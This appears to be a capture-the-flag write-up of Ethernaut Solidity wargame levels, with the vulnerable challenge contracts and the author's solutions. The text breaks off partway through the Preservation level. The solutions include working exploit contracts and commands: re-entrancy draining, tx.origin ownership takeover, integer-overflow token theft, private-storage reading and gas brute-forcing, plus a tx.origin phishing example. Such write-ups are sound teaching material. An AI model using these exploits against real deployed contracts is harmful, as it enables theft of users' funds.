# ethernaut solutions

## Hello Ethernaut

```
await contract.info()
```

"You will find what you need in info1()."

```
await contract.info1()
```

"Try info2(), but with \"hello\" as a parameter."

```
await contract.info2("hello")
```

"The property infoNum holds the number of the next info method to call."

```
await contract.infoNum()
```

words: Array(2)
0: 42

```
await contract.info42()
```

"theMethodName is the name of the next method."

```
await contract.theMethodName()
```

"The method name is method7123949."

```
await contract.method7123949()

```

"If you know the password, submit it to authenticate()."

```

await contract.password()

```

"ethernaut0"

```
await contract.authenticate("ethernaut0")
```

Submit Instance!

##Fallback

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

For general info, this is what the contract wants users to do - send them ethers in small increments until it reaches 1000 eth to transfer ownership

1. Find out the wei of say 0.0001 ether as there is a require of msg.value being < than 0.001 eth:

```
toWei('0.0001') == "100000000000000"
```

2.

```
await contract.contribute.sendTransaction({from:"YOUR ADDRESS", to:"YOUR INSTANCE ADDRESS", value: "100000000000000"})
```

Once we've done the above steps, our balance in the contract is now > 0 which can be checked by

```
await contract.contributions("our address")
```

On the other hand, the contract has a fallback or receive() function which simply transfers ownership to the sender if require(msg.value > 0 && contributions[msg.sender] > 0) is met. So we'll do just that:

3. by just sending a transaction without a function and passing a small msg.value with it:

```
await contract.sendTransaction({from:"YOUR ADDRESS", to:"YOUR INSTANCE ADDRESS", value: "100"})
```

4. contract.owner() will now show your address so you can call withdraw()!

```
await contract.withdraw()
```

which will transfer the balance of eth you've sent which is the only eth on the account back to yourself. In our case, this will be:

0.0001000000000001

The contributions values won't change for the original owner and us because there is no logic in the contract adjusting them

5. Submit Instance!

## Fallout

```
Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

1. A mistake in this contract is that its constructor is called Fal1out which is a typo from the name of the contract Fallout():
   /_ constructor _/
   function Fal1out() public payable {
   owner = msg.sender;
   allocations[owner] = msg.value;
   }

So we can just call this function and take it over!
await contract.Fal1out.sendTransaction({from:"YOUR ADDRESS", to:"YOUR INSTANCE ADDRESS", value: "10"}) - any value in wei

Check:

before:

```
await contract.owner()
```

will show "0x0000000000000000000000000000000000000000"

after:

```
await contract.owner()
```

will show "YOUR ADDRESS"

Real examples of such simple human errors
This seemingly trivial level illustrates how simple errors like typos, have historically resulted in serious problems:
The Rubixi Bug
In the Rubixi incidence, the developer changed the contract’s name from Dynamic Pyramid to Rubixi. However, he forgot to rename his constructor function from DynamicPyramid() to Rubixi().
Adversaries were then able to call the now publicly invokable DynamicPyramid() function to gain control of the contract and transfer its ethers out.

## Coin Flip

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

1. create a contract in Remix that will send only winning transactions by using the same logic as in the contract for randomness:

```
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool guess) external returns (bool);
 }

contract Flipper {

    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;
    CoinFlip public flipper;

    constructor() public {
        flipper = CoinFlip(your instance address);
    }

   function doFlip() public{
      uint256 blockValue = uint256(blockhash(block.number - 1));
       uint256 coinFlip = uint256(uint256(blockValue)/FACTOR);
       side = coinFlip == 1 ? true : false;
      flipper.flip(side);
    }
}
```

2. ignore warnings about infinite gas costs that Remix may throw - it's a bug on Remix's side that it thinks coinflip above has loops or unbounded variables

3. select Injected Web3 and deploy Flipper into Rinkeby

4. When done, select function doFlip in Remix's UI which will trigger flip. Repeat 10x or more! Some will fail, some will give warnings - ignore!

5. call

```
await contract.consecutiveWins()
```

and you'll see 10 or more in the first position of the Array

6. Submit Instance!

## Telephone

Difficulty 1/10

Claim ownership of the contract below to complete this level.

Things that might help

See the Help page above, section "Beyond the console"

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

1. tx.origin can be a contract, while msg.sender is the person initiating the sending so if we create a contract that will call changeOwner(our address) we can claim the ownership to our address:

```
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

interface  Telephone {
    function changeOwner(address _owner) external;
 }

contract ChangeOwner {

    event showTxOriginAndMsgSender(address x, address y);

   address newOwner = your address;
    Telephone public phone;

    constructor() public {
        phone = Telephone(instance address);

    }

   function change() public{
      phone.changeOwner(newOwner);
    }


   function show() public{
     emit showTxOriginAndMsgSender(tx.origin, msg.sender);
      return;
    }

}
```

2. Check old owner:

```
await contract.owner()
```

3. Deploy ChangeOwner above on Remix and call change() from Remix dashboard

4. Check new owner:

```
await contract.owner()
```

5. Submit instance!

While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.

An example of a possible attack is outlined below.

Use tx.origin to determine whose tokens to transfer, e.g.

```
function transfer(address \_to, uint \_value) {
tokens[tx.origin] -= \_value;
tokens[_to] += \_value;
}
```

Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```
function () payable {
token.transfer(attackerAddress, 10000);
}
```

In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

## Token

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:

What is an odometer?

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

As you can see above, balances is a mapping of uints or unsigned integers and so is uint \_value so uint minus uint will always be a positive uint regardless so it makes sense to use safemath library for minus or plus operators!

We could transfer any value to ourselves by just calling contract.transfer("our address", totalSupply), but it won't work because:
balances[msg.sender] -= \_value;
balances[_to] += \_value;

So we just need to call the function ```await contract.transfer(instance, 21)``` The 2nd parameter needs to be > 20. In that case balances[msg.sender] -= \_value will flip from negative to a huge positive number because of overflow. For example, call it with 21,000,000 will end up with the following: 

So in our first case, it's returning just 20 because if we do let x = await contract.balanceOf("our address") followed by x.toString(), we'll get "20" if we do the same in the latter case, it will convert this BN array to a string looking as follows: "115792089237316195423570985008687907853269984665640564039457584007913108639956" which is of course 2²⁵⁶–21000000+20 or just 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936 - 20,999,980.

This is happening because of this line balances[msg.sender] -= _value;  which makes the balance jump from negative impossible for a uint to a high positive - right to the end of the 2²⁵⁶ number scale!

Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
a = a + c;
}
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);
If there is an overflow, the code will revert.

To find out totalsupply, we just call await contract.totalSupply()

## Delegation

Difficulty 4/10

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids
Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

So to solve this challenge, we should remember that in Ethereum, you can invoke a public function by sending data in a transaction. The format is as follows:
contractInstance.call(bytes4(sha3("functionName(inputType)"))

So we need to call the function pwn() which will update the owner. To do that, we can encode it as follows: bytes4(sha3("pwn()")) and put it into the data fields calling the Delegate contract:

```
await sendTransaction({
  from: "our address",
  to: "our instance address",
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
```

To check,``` await contract.owner() ```reveals that you are now the owner!  

## Force

Difficulty 5/10

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
See the Help page above, section "Beyond the console"
In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

```
Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

```

There are three ways for a contract to receive ether
Method 1 — via payable functions: the fallback function is to intentionally allow your contract to receive Ether from other contracts and external wallets. But if no such payable function exists, your contract still has 2 more indirect ways of receiving funds:
Method 2 — receiving mining reward: contract addresses can be designated as the recipients of mining block rewards.
Method 3 — from a destroyed contract: As discussed, selfdestruct lets you designate a backup address to receive the remaining ethers from the contract you are destroying.

So our solution for this challenge is #3 above - create a contract that will self-destroy and send its ETH to our Force contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract SelfDestructingContract {

  //this is for checking that we have some ETH - important to add "view" as otherwise it won't show the value in the output in etherscan, etc
    function collect() public view returns(uint) {
    return address(this).balance;
}

//this is for destroying the contract and sending ETH to our target
function selfDestroy() public {
    address payable addr = "our target address"; e.g. 0x24242424...
    selfdestruct(addr);
}

// this one is need to be able to receive ETH - if you don't add it, your contract won't be able to receive ETH by sending it to it
receive () external payable  { }

}

```


## Vault
Difficulty 3/10

Unlock the vault to pass the level!

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

To solve this task, we'll need to deploy this contract and then call the storage of the 2nd variable at index 1 ```web3.eth.getStorageAt(instance.address, 1, (err,res)=>{console.log(res)});```

It'll return "0x412076657279207374726f6e67207365637265742070617373776f7264203a29"

The returned value is in hex, which we can convert using ```web3.utils.hexToAscii ``` this will give us "A very strong secret password :)"

After that we can pass it in hex format as bytes32 to function unlock: ```await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")```

To check, we just call value "locked": ```await contract.locked()``` will return false

## King
Difficulty 6/10

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

Most of Ethernaut's levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.

In this case, see: King of the Ether and King of the Ether Postmortem

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

We create a helper contract BadKing:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract BadKing {

  function becomeKing(address king) public payable {
      
      require(msg.value == 1 ether, "please send exactly 1 ether");
      
    (bool success, ) = king.call.value(msg.value)("");
    
    require(success, "External call failed");
  }

//this is to reject anyone paying and getting the throne, alternatively could have not had anything here at all, but then no message!
receive() external payable {
    require(false, "cannot claim my throne!");
}
}
```

Once it's deployed, we call BadKing becomeKing function, not forgetting to pass 1 ETH in value field in the upper part of Remix:

becomeKing("our instance") with value field = 1 ETH

now if you call ```await contract._king()```, you'll see your contract address as the new king.

It will not give it up though, as it's transfer function always defaults to receive() => false!

##  Re-entrancy
Difficulty 6/10

The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.

```
Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!


To solve this, we create a new contract and call those functions:


```
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

interface  Reentrance {
   function donate(address _to) external payable;
   function withdraw(uint _amount) external;
 }
 
contract Reentrancy {
    
    Reentrance public original = Reentrance(0x11b4747B9b3f4531CD99dC9f7f9D8648D268f547);
    uint public amount = 1 ether;    //withdrawal amount each time
    
    constructor() public payable {
}


function donateToSelf(uint _amount) public {
    original.donate.value(_amount).gas(4000000)(address(this));//need to add value to this fn
  }
  
   receive() external payable {
    if (address(original).balance != 0 ) {
        original.withdraw(amount); 
    }
}
}

```

when deploying the above contract for the 1st time, we pass on a balance of 1+ ETH

Then we donate an amount - make it 1 or another full eth.

```await web3.eth.getBalance("our instance")``` to check

After that we just send a tiny amount back to our contract via Metamask, which triggers calling the other contract.



## Elevator
Difficulty 4/10

This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().

Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
Level author:
Martin Triay

To solve the above challenge, we need to create a new contract called Building and pass on a function in it called isLastFloor that will alternate from false to true. That contract will need to call the instance and by doing so, it will act as the Building contract.

```
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

interface  Elevator {
  function goTo(uint _floor) external;
}
contract Building {
    Elevator public el = Elevator(0xd659058e82b8188AA035F094A3dE70030B958c5A); 
    bool public switchFlipped =  false; 
    
    function hack() public {
        el.goTo(1);
    }
    
    function isLastFloor(uint) public returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
}
```

## Privacy
Difficulty 8/10

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

Understanding how storage works
Understanding how parameter parsing works
Understanding how casting works
Tips:

Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": How to read Ethereum contract storage

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```
Level author:
Alejandro Santander

In Remix we run a JS script for all the variables in the Rinkeby version of our instance like so:

```
(async () => {
    
  try {
      let data = [];
    let callbackFNConstructor = (index) => (error, contractData) => {
         data[index] = contractData;
    }
    
     console.log("here4");
     
    for(var i = 0; i < 7; i++) {
                let x = await web3.eth.getStorageAt("our instance", i, callbackFNConstructor(i));
                console.log(i+"  =>  "+x);
        }
        

  } catch (e) {
    console.log(e.message)
  }
})()
```

This will produce something like this:
```
0  =>  0x0000000000000000000000000000000000000000000000000000000000000001
1  =>  0x00000000000000000000000000000000000000000000000000000000611a6bf6
2  =>  0x000000000000000000000000000000000000000000000000000000006bf6ff0a
3  =>  0xe9a24e3b2623ff89f60846bc76f2b35d82ba68743f599c60020dc653e32af4c3
4  =>  0x5701525ecdbef03045a04be653e9b3a7eefbc8c79af8135e50d6abfafa7bb9ec
5  =>  0x0633fd0cf3646f9e769532d1dc9583c7a74a39bfd54cd8909737556658993c6f
6  =>  0x0000000000000000000000000000000000000000000000000000000000000000
```

As you can see our data is in slot 0 to 6.

Slot 0 will be all zeros when it's false and 01 when it's true
Slot 1 is the block.timestamp in hex so 1629121526 is equivalent to Monday, 16 August 2021 13:45:26 if we use a unix timestamp to date converter
Slot 2 consists of several values, namely:   
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  In other words:
  10 = 0a in hex
  255 = FF in hex
  now = block.timestamp = 1629121526, which is converted to uint16 becomes 27638 which is in hex = 6BF6

Slot 3 to 5 are the three slots of bytes32[3] private variable data

We require data[2] meaning it's the data stored in slot 5!

We get it by simply going to contract console and calling ```await web3.eth.getStorageAt(instance, 5)``` which returns ```0x0633fd0cf3646f9e769532d1dc9583c7a74a39bfd54cd8909737556658993c6f```

We then convert this bytes32 value to bytes16: and get its first half: ```0x0633fd0cf3646f9e769532d1dc9583c7a74a39bfd54cd8909737556658993c6f``` and get ```0x0633fd0cf3646f9e769532d1dc9583c7```

This is what we need to unlock the contract: ```await contract.unlock("0x0633fd0cf3646f9e769532d1dc9583c7")```

after that calling ```await contract.locked()``` returns false!

## Gatekeeper One
Difficulty 5/10

Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:
Remember what you've learned from the Telephone and Token levels.
You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
Level author:
0age
0age@protonmail.com
https://github.com/0age


To solve this level we need to call the enter function and pass the conditions of each function modifier.
To pass:

gateOne: a malicious contract needs to be created with a function letMeIn that calls the enter function of the Gatekeeper contract. By calling letMeIn in Remix-IDE tx.origin ≠ msg.sender.

gateTwo: to see the remaining gas we can use the functionality of Remix-IDE. The value we are looking for will be shown after the opcode GAS, i.e. in the opcode PUSH2 (see picture below). Knowing this value we could add the proper gas amount to our call in order to pass gateTwo. However, as mentioned by Spalladino, the proper gas offset to use will vary depending on the compiler. We will use his solution in our malicious contract and brute-force a range of possible gas values. To account for it, we will increase the gas limit not in Remix-IDE, but in Metamask when sending this transaction (Remix limit doesn't change the Metamask limit!).

finally, gateThree:
  1st condition: the last 8 hex need to be equal to the last 4 hex -> only possible if we mask part of _gateKey with 0, so that: 0x0000???? = 0x????.
  2nd condition: is achieved if the rest of the key is different from 0 so that 0x0000???? ≠ 0x????????0000????
  3rd condition: 0x0000???? needs to be equal to the last 4 hex of tx.origin
We will create a variable to store the last 16 digits of our account and another one for the key. One possible solution is to use the value of tx.origin and only mask part of it with 0 (as described in the 1st condition).
In summary, we will create a malicious contract in Remix-IDE that calls the enter function of the Gatekeeper contract (thus passing gateOne). We will append a gas value to our call that will vary in order to brute force gateTwo (using Spalladino’s solution). Finally, we will pass to our call a parameter made by masking part or the value of tx.origin (in order to pass gateThree).


```
contract AreYouTheKeymaster{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x827279cfffb92266; //last 16 digits of your account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    function setGatekeeperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }
    
    function letMeIn() public returns (uint256){
         for (uint256 i = 0; i < 120; i++) {
            console.log("Running letMeIn:", i);
         (bool result, ) = address(gkpOne).call.gas(
          i + 150 + 8191*3)(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
             console.log("Running letMeIn, result:", result, i);
            return i;
        break;
        
      }
    }
  }
```

## Gatekeeper Two
Difficulty 6/10

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:
Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

To solve this we need to create this contract. As you can see, it runs it all in the constructor - this is to make sure extcodesize(caller() returns 0 when it's being deployed. The XOR ^ operator is bitwise exclusive OR If A xor B = C, then A xor C = B. xor forms an abelian group and each element is its own inverse, i.e., it’s commutative and x ^ x == 0.

```
contract AreYouTheKeymaster2{
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)); //should change msg.sender to this!!
    GatekeeperTwo public gkpTwo;    
    constructor(address _addr) public{
      gkpTwo = GatekeeperTwo(_addr);
      (bool result, ) = address(gkpTwo).call.gas(5000000)(abi.encodeWithSignature("enter(bytes8)", key)); 
  }  
}
```


## Naught Coin
Level completed!
Difficulty 5/10

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec
The OpenZeppelin codebase
When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

To solve this, we need to use ERC20 methods approve and transferFrom:

```await contract.approve("YOUR ADDRESS", "1000000000000000000000000")```

and then

```await contract.transferFrom('YOUR ADDRESS', "RECIPIENT ADDRESS", "1000000000000000000000000")```

## Preservation
Difficulty 8/10

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
Understanding what it means for delegatecall to be context-preserving.
Understanding how storage variables are stored and accessed.
Understanding how casting works between different data types.
Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
